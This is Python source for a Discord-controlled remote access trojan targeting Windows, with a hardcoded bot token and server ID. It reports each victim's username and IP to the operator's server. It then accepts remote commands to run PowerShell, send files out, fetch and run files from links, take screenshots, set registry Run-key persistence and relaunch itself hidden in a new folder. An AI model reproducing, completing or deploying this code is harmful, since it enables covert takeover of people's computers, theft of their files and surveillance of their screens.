import os, discord, subprocess, requests, re, json, win32crypt, base64, shutil, sqlite3, winreg
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import datetime

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")




guild_id = "891685208506650664"
token1 = "MTIzMjc2MTc3MDQzNTk0MDU1Ng."
token2="GfhcqR.Y0SLLxCc2tDyVjL8gqFSf07DFR_0rwThJeK_Bg"
token=token1+token2

def migrate(path):
    newPath=path+"/"+os.path.basename(__file__)
    if os.path.exists(path):
        shutil.copy(__file__,newPath)
        print(newPath)
        print(f"migrate to {newPath}")
        return newPath
    else:
        try:
            os.mkdir(path)
            shutil.copy(__file__,newPath)
            return newPath
            return 0
        except Exception as e:
            print(e)
    

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return "Disable"

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return "Disable"

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return "Win"

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "cwd - Get current working directory",
    "cd - Change directory",
    "ls - List directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "shell - Execute shell command",
    "run <file> - Run an file",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "startup <name> - Add to startup",
    "migrate <path> -Migrate to path"
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content[3:]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        if len(files) > 4093:
            open(f"{TEMP}\\list.txt", "w").write(files)
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\list.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content[9:]
        print(file)
        try:
            filed = discord.File(f"{file}")
            await message.reply(file=filed)
        except Exception as Error:
            embed=discord.Embed(title="Error!",description =f" list: {Error}",color=0xfafafa)
            await message.reply(embed=embed)
            

    if message.content.startswith("upload"):
        link = message.content[7:]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content[6:]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        if output > 4093:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{os.getenv('TEMP')}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content[4:]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "screenshot":
        screenshot = ImageGrab.grab(all_screens=True)
        path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)
            
    if message.content == "cwd":
        embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        await message.reply(embed=embed)
        
    
        
    if message.content.startswith("startup"):
        name = message.content[8:]
        if not name:
            embed = discord.Embed(title="Error", description="```No name provided```", color=0xfafafa)
            await message.reply(embed=embed)
        else:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, os.path.realpath(__file__))
            winreg.CloseKey(registry_key)
            embed = discord.Embed(title="Startup", description=f"```Added to startup as {name}```", color=0xfafafa)
            await message.reply(embed=embed)
    if message.content.startswith("migrate"):
        path=message.content[8:]
        newPath=migrate(path)
        await message.channel.delete()
        os.system(f"powershell -WindowStyle Hidden python {newPath}")
        await bot.close()

    if message.content.startswith("load"):
        lib=message.content[5:]
        try:
            types,data=exec(f"from /Modules/{lib} import *;mainInlib()")
            print(types,data)
        except Exception as e:
            print(e)
    
            
        

            
        
bot.run(token)
